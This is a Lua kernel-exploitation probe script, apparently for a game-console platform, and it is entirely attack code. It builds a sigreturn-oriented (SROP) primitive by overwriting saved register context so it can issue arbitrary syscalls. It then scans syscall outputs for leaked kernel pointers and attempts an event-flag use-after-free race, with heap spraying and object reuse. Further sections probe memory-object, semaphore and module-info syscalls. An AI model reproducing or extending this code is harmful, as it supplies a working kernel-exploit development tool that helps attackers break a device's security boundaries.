-- CRASH_CLASS: HIGH
-- PROBE 137b: Event flag UAF race + sys 547 deep scan
--
-- 137a showed event flags (538-546) work and sys 547 returns VM info.
-- Plan A: Try to expand sys 547 output by querying EVERY mapped region
--   and scanning all returned data for kernel pointers.
-- Plan B: Event flag use-after-free via thread race:
--   1. Create event flag
--   2. Spawn thread waiting on it (blocks in kernel)
--   3. Delete event flag from main thread
--   4. Signal old handle → kernel accesses freed memory → UAF
-- Plan C: Semaphore objects (549-556) as additional kernel objects

print("=== PROBE 137b: EVF RACE + 547 DEEP ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end

--------------------------------------------------------------------
-- SECTION A: sys 547 deep scan — query EVERY region from sys 674
-- sys 674 enumerates all regions. For each start address, call 547
-- and check if the full output buffer has kernel pointers beyond 0x18
--------------------------------------------------------------------
print("")
print("--- [A] sys 547 deep scan ---")

-- First, use sys 674 to get all region addresses
local map_buf = gpu + 0x100
local map_count = gpu + 0x80

-- sys 674: virtual_query_all(buf, buf_size, count_out)
zero(map_buf, 0x4000)
memory.write_qword(map_count, uint64(0))
local rv674 = srop(674, ua(map_buf), uint64(0x4000), ua(map_count))
print("[A] 674 rv=" .. hex(rv674))
local nregions = to_num(memory.read_dword(map_count))
print("[A] regions=" .. nregions)

-- For each region, call 547 with a LARGE output buffer (0x100 instead of 0x18)
-- to see if more data is written beyond the contract's 0x18
local kfound = 0
local query_buf = gpu + 0x5000
local region_size = 72  -- each 674 record is 72 bytes per 55e/55f

local regions_to_scan = math.min(nregions, 40)
for i = 0, regions_to_scan - 1 do
    local rec = map_buf + (i * region_size)
    local start_addr = safe_rq(rec)
    if start_addr then
        local sh, sl = get_hi_lo(start_addr)
        if sh > 0 or sl > 0 then
            -- Call 547 with large output buffer
            zero(query_buf, 0x100)
            local rv547 = srop(547, start_addr, ua(query_buf))
            local r547h, r547l = get_hi_lo(rv547)
            if r547l == 0 and r547h == 0 then
                -- Check ALL 0x100 bytes for kernel pointers
                for off = 0, 0xF8, 8 do
                    local v = safe_rq(query_buf + off)
                    if v then
                        local vh, vl = get_hi_lo(v)
                        if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                            kfound = kfound + 1
                            print(string.format("[A] *** KPTR region %d (start=%s) +0x%02X: %s ***",
                                i, hex(start_addr), off, hex(v)))
                        end
                    end
                end
                -- Print first 0x20 bytes if there's data beyond 0x18
                local v_20 = safe_rq(query_buf + 0x18)
                if v_20 then
                    local vh, vl = get_hi_lo(v_20)
                    if vh > 0 or vl > 0 then
                        print(string.format("[A] region %d extra+0x18: %s +0x20: %s",
                            i, hex(v_20),
                            hex(safe_rq(query_buf + 0x20) or uint64(0))))
                    end
                end
            end
        end
    end
end
print("[A] kptrs from 547=" .. kfound)
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION B: sys 533 — create memory object + descriptor
-- Contract: 3 args (unused_slot_0, size, flags)
-- Returns a descriptor that might be usable with other syscalls
--------------------------------------------------------------------
print("")
print("--- [B] sys 533: memory object ---")

-- Create a 64KB memory object
local rv533 = srop(533, uint64(0), uint64(0x10000), uint64(0))
print("[B] 533(0,64K,0)=" .. hex(rv533))
local r533h, r533l = get_hi_lo(rv533)

-- Try with different flags
local rv533b = srop(533, uint64(0), uint64(0x10000), uint64(1))
print("[B] 533(0,64K,1)=" .. hex(rv533b))

local rv533c = srop(533, uint64(0), uint64(0x10000), uint64(0x33))
print("[B] 533(0,64K,0x33)=" .. hex(rv533c))

-- If any succeeded (positive small number = descriptor), try to map it
local desc = -1
for _, rv in ipairs({rv533, rv533b, rv533c}) do
    local h, l = get_hi_lo(rv)
    if h == 0 and l > 0 and l < 0x10000 then
        desc = l
        break
    end
end

if desc >= 0 then
    print("[B] descriptor=" .. desc)
    -- Try mmap with descriptor
    local rv_mm = srop(477, uint64(0), uint64(0x10000), uint64(3),
        uint64(0x1), uint64(desc), uint64(0))
    print("[B] mmap(desc)=" .. hex(rv_mm))

    -- sys 534: create alias descriptor
    local rv534 = srop(534, uint64(desc), uint64(7))
    print("[B] 534(alias)=" .. hex(rv534))

    -- sys 547 on mapped address if it worked
    local mmh, mml = get_hi_lo(rv_mm)
    if mmh > 0 or (mml > 0 and mml < 0xFFFF0000) then
        zero(query_buf, 0x40)
        local rv547d = srop(547, rv_mm, ua(query_buf))
        print("[B] 547(mapped desc)=" .. hex(rv547d))
        if to_num(rv547d) == 0 then
            for off = 0, 0x38, 8 do
                local v = safe_rq(query_buf + off)
                if v then
                    local vh, vl = get_hi_lo(v)
                    if vh > 0 or vl > 0 then
                        print(string.format("  +0x%02X: %s", off, hex(v)))
                    end
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        print("  *** KERNEL POINTER! ***")
                        kfound = kfound + 1
                    end
                end
            end
        end
    end
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION C: Event flag UAF race
-- 1. Create event flag
-- 2. Spawn thread that waits on it (blocks in kernel)
-- 3. Delete event flag from main thread
-- 4. Check if freed memory is accessible
--------------------------------------------------------------------
print("")
print("--- [C] EVF UAF race ---")

local name_buf = gpu + 0x6000
ws(name_buf, "race_evf")

-- Create event flag
local rv_create = srop(538, ua(name_buf), uint64(0), uint64(0))
local crh, crl = get_hi_lo(rv_create)
print("[C] create evf=" .. hex(rv_create))

if crl > 0 and crl < 0x100000 and crh == 0 then
    local evf_handle = crl
    print("[C] handle=" .. evf_handle)

    -- Spray many event flags to fill kernel allocator
    local spray_handles = {}
    for i = 1, 16 do
        ws(name_buf, "spray_" .. i)
        local rv_sp = srop(538, ua(name_buf), uint64(0), uint64(0))
        local sph, spl = get_hi_lo(rv_sp)
        if spl > 0 and spl < 0x100000 and sph == 0 then
            table.insert(spray_handles, spl)
        end
    end
    print("[C] sprayed " .. #spray_handles .. " event flags")

    -- Create thread that will WAIT on the event flag
    -- Thread does: sys 542(handle, pattern=0xFFFF, mode=0, observed_buf, timeout=0)
    -- With timeout=0, it should return immediately (poll mode)
    -- But with a non-zero timeout, it would block
    pcall(function() return sc_gc(uint64(ctx)) end)
    local thr_ctx = gpu + 0x7000
    for off = 0, 0x4FF, 8 do
        memory.write_qword(thr_ctx + off, memory.read_qword(ctx + off))
    end
    local T = thr_ctx + MC
    -- Thread calls sys 542: wait on event flag
    -- RDI=handle, RSI=pattern, RDX=mode, R10=observed_buf, R8=timeout_ptr
    memory.write_qword(T + 0xA0, sc_addr)
    memory.write_qword(T + 0x38, uint64(542))
    memory.write_qword(T + 0x08, uint64(evf_handle)) -- handle
    memory.write_qword(T + 0x10, uint64(0xFFFFFFFF)) -- pattern (wait for any bit)
    memory.write_qword(T + 0x18, uint64(0))           -- mode
    local obs_buf = gpu + 0x7F00
    zero(obs_buf, 0x20)
    memory.write_qword(T + 0x50, ua(obs_buf))         -- R10=observed output
    -- timeout: set a 5-second timeout
    local timeout_buf = gpu + 0x7E00
    memory.write_qword(timeout_buf, uint64(5))         -- tv_sec = 5
    memory.write_qword(timeout_buf + 8, uint64(0))     -- tv_nsec = 0
    memory.write_qword(T + 0x28, ua(timeout_buf))      -- R8=timeout
    -- Thread stack
    local thr_stack = gpu + 0x70000
    memory.write_qword(T + 0xB8, uint64(string.format("0x%X", to_num(thr_stack + 0xFF0))))

    local tid_ptr = gpu + 0x7D00
    memory.write_qword(tid_ptr, uint64(0))
    local rv_tc = srop(430, ua(thr_ctx), ua(tid_ptr), uint64(0))
    local tid_v = memory.read_qword(tid_ptr)
    print("[C] wait thread rv=" .. hex(rv_tc) .. " tid=" .. hex(tid_v))

    -- Give thread time to enter the wait
    local d = 0
    for i = 1, 10000 do d = d + 1 end

    -- NOW: delete the event flag while thread might be waiting on it
    local rv_del = srop(539, uint64(evf_handle))
    print("[C] delete evf (while thread waiting)=" .. hex(rv_del))

    -- Try to set bits on the deleted handle
    local rv_set = srop(544, uint64(evf_handle), uint64(0xDEADBEEF))
    print("[C] set deleted handle=" .. hex(rv_set))

    -- Create new objects that might reuse the freed memory
    for i = 1, 8 do
        ws(name_buf, "reuse_" .. i)
        local rv_ru = srop(538, ua(name_buf), uint64(0), uint64(0xAAAAAAAA))
        local ruh, rul = get_hi_lo(rv_ru)
        if rul > 0 and rul < 0x100000 and ruh == 0 then
            -- Poll the reused object — if data is corrupted, we might see kernel pointers
            zero(obs_buf, 0x40)
            local rv_poll = srop(543, uint64(rul), uint64(1), uint64(0), ua(obs_buf))
            local ph, pl = get_hi_lo(rv_poll)
            if pl == 0 and ph == 0 then
                for off = 0, 0x30, 8 do
                    local v = safe_rq(obs_buf + off)
                    if v then
                        local vh, vl = get_hi_lo(v)
                        if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                            kfound = kfound + 1
                            print(string.format("[C] *** KPTR in reused obj +0x%02X: %s ***",
                                off, hex(v)))
                        end
                    end
                end
            end
        end
    end

    -- Check thread status
    local tv = to_num(tid_v)
    if tv > 0 then
        local rv_tk = srop(433, uint64(tv), uint64(0))
        local tkh, tkl = get_hi_lo(rv_tk)
        print("[C] wait thread: " .. ((tkl == 0 and tkh == 0) and "ALIVE" or "EXITED"))
    end

    -- Clean up spray
    for _, h in ipairs(spray_handles) do
        srop(539, uint64(h))
    end

    print("[C] observed buf:")
    for off = 0, 0x18, 8 do
        local v = safe_rq(obs_buf + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh > 0 or vl > 0 then
                print(string.format("  +0x%02X: %s", off, hex(v)))
            end
        end
    end
end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION D: Semaphore objects (549-556) — another kernel object type
--------------------------------------------------------------------
print("")
print("--- [D] sys 549: semaphore ---")

ws(name_buf, "test_sem")
-- 549: create (name, attributes, initial_count, max_count)
local rv549 = srop(549, ua(name_buf), uint64(0), uint64(1), uint64(10))
print("[D] 549(create)=" .. hex(rv549))
local s549h, s549l = get_hi_lo(rv549)

if s549l > 0 and s549l < 0x100000 and s549h == 0 then
    local sem_handle = s549l
    print("[D] sem handle=" .. sem_handle)

    -- 554: try to consume (non-blocking)
    local rv554 = srop(554, uint64(sem_handle), uint64(1))
    print("[D] 554(try)=" .. hex(rv554))

    -- 555: post (add count)
    local rv555 = srop(555, uint64(sem_handle), uint64(5))
    print("[D] 555(post 5)=" .. hex(rv555))

    -- 556: cancel/reset with waiter count output
    local waiter_buf = gpu + 0x7F40
    zero(waiter_buf, 0x20)
    local rv556 = srop(556, uint64(sem_handle), uint64(0), ua(waiter_buf))
    print("[D] 556(cancel)=" .. hex(rv556))
    print("[D] waiter_count=" .. hex(safe_rq(waiter_buf) or uint64(0)))

    -- Delete
    srop(550, uint64(sem_handle))
end
print("[D] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION E: sys 660 with different struct layouts
-- Maybe the v2 info struct has a different size field
--------------------------------------------------------------------
print("")
print("--- [E] sys 660: module v2 deep ---")

local info2 = gpu + 0x5800
-- Try different size values in the struct header
for _, sz in ipairs({0x100, 0x160, 0x200, 0x300, 0x400}) do
    zero(info2, sz)
    memory.write_dword(info2, sz)  -- size at +0x00
    local rv660 = srop(660, uint64(0), uint64(0), ua(info2))
    local r660h, r660l = get_hi_lo(rv660)
    if r660l == 0 and r660h == 0 then
        print(string.format("[E] 660(0, sz=0x%X) WORKS!", sz))
        for off = 0, math.min(sz, 0x100) - 4, 8 do
            local v = safe_rq(info2 + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh > 0 or vl > 0 then
                    print(string.format("  +0x%03X: %s", off, hex(v)))
                end
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print("  *** KERNEL POINTER! ***")
                end
            end
        end
    else
        print(string.format("[E] 660(0, sz=0x%X) rv=%s", sz, hex(rv660)))
    end
end

-- Try handles 19 and 20 (from 659 enumeration)
for _, h in ipairs({19, 20}) do
    zero(info2, 0x200)
    memory.write_dword(info2, 0x200)
    local rv660h = srop(660, uint64(h), uint64(0), ua(info2))
    local rh660, rl660 = get_hi_lo(rv660h)
    if rl660 == 0 and rh660 == 0 then
        print(string.format("[E] 660(h=%d) WORKS!", h))
        for off = 0, 0x100, 8 do
            local v = safe_rq(info2 + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh > 0 or vl > 0 then
                    print(string.format("  +0x%03X: %s", off, hex(v)))
                end
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print("  *** KERNEL POINTER! ***")
                end
            end
        end
    end
end
print("[E] pid=" .. to_num(sc20()))

print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
